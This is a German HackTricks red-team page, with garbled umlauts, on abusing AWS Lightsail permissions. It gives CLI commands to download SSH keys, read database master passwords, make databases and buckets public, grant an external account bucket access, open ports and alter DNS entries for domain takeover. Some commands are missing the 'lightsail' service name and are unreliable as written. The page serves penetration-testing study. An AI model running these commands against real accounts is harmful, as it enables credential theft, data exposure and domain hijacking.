# AWS - Lightsail Privilege Escalation

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Lightsail

F√ºr weitere Informationen zu Lightsail siehe:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Es ist wichtig zu beachten, dass Lightsail **keine IAM-Rollen des Benutzers** verwendet, sondern einem von AWS verwalteten Konto zugeordnet ist. Daher k√∂nnen Sie diesen Dienst nicht zum Privilege Escalation missbrauchen. Es k√∂nnten jedoch **sensible Daten** wie Code, API-Schl√ºssel und Datenbankinformationen in diesem Dienst gefunden werden.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Diese Berechtigung erm√∂glicht es Ihnen, die SSH-Schl√ºssel zum Zugriff auf die Instanzen zu erhalten:
```
aws lightsail download-default-key-pair
```
**Potenzielle Auswirkungen:** Finden sensibler Informationen innerhalb der Instanzen.

### `lightsail:GetInstanceAccessDetails`

Diese Berechtigung erm√∂glicht es Ihnen, SSH-Schl√ºssel zu generieren, um auf die Instanzen zuzugreifen:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Potenzielle Auswirkungen:** Sensible Informationen innerhalb der Instanzen finden.

### `lightsail:CreateBucketAccessKey`

Diese Berechtigung erm√∂glicht es Ihnen, einen Schl√ºssel zum Zugriff auf den Bucket zu erhalten:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Potenzielle Auswirkungen:** Finde sensible Informationen innerhalb des Buckets.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Diese Berechtigung erm√∂glicht es Ihnen, die Anmeldeinformationen zum Zugriff auf die Datenbank abzurufen:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Potenzielle Auswirkungen:** Sensible Informationen in der Datenbank finden.

### `lightsail:UpdateRelationalDatabase`

Diese Berechtigung erm√∂glicht es Ihnen, das Passwort zum Zugriff auf die Datenbank zu √§ndern:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Wenn die Datenbank nicht √∂ffentlich ist, k√∂nnten Sie sie auch mit diesen Berechtigungen √∂ffentlich machen:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Potenzielle Auswirkungen:** Sensible Informationen in der Datenbank finden.

### `lightsail:OpenInstancePublicPorts`

Diese Berechtigung erm√∂glicht das √ñffnen von Ports f√ºr das Internet.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Ports.

### `lightsail:PutInstancePublicPorts`

Diese Berechtigung erm√∂glicht das √ñffnen von Ports f√ºr das Internet. Beachten Sie, dass der Aufruf jeden nicht spezifizierten ge√∂ffneten Port schlie√üt.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Potenzielle Auswirkungen:** Zugriff auf sensible Ports.

### `lightsail:SetResourceAccessForBucket`

Diese Berechtigungen erm√∂glichen es, einer Instanz Zugriff auf einen Bucket ohne zus√§tzliche Anmeldeinformationen zu gew√§hren

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Potenzielle Auswirkungen:** M√∂glicher neuer Zugriff auf Eimer mit sensiblen Informationen.

### `lightsail:UpdateBucket`

Mit dieser Berechtigung k√∂nnte ein Angreifer seinem eigenen AWS-Konto Lesezugriff auf Eimer gew√§hren oder die Eimer sogar f√ºr alle √∂ffentlich machen:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Potenzielle Auswirkungen:** Potenzieller neuer Zugriff auf Buckets mit sensiblen Informationen.

### `lightsail:UpdateContainerService`

Mit diesen Berechtigungen k√∂nnte ein Angreifer Zugriff auf private ECRs vom Containerdienst gew√§hren.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Potenzielle Auswirkungen:** Erhalten sensibler Informationen aus privatem ECR

### `lightsail:CreateDomainEntry`

Ein Angreifer mit dieser Berechtigung k√∂nnte eine Subdomain erstellen und sie auf seine eigene IP-Adresse umleiten (Subdomain-√úbernahme), oder einen SPF-Eintrag erstellen, der es ihm erm√∂glicht, E-Mails von der Domain zu f√§lschen, oder sogar die Hauptdomain auf seine eigene IP-Adresse setzen.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potenzielle Auswirkung:** √úbernahme einer Domain

### `lightsail:UpdateDomainEntry`

Ein Angreifer mit dieser Berechtigung k√∂nnte eine Subdomain erstellen und sie auf seine eigene IP-Adresse umleiten (Subdomain-√úbernahme), oder einen SPF-Eintrag erstellen, der es ihm erm√∂glicht, E-Mails von der Domain zu f√§lschen, oder sogar die Hauptdomain auf seine eigene IP-Adresse setzen.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potenzielle Auswirkungen:** √úbernahme einer Domain

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
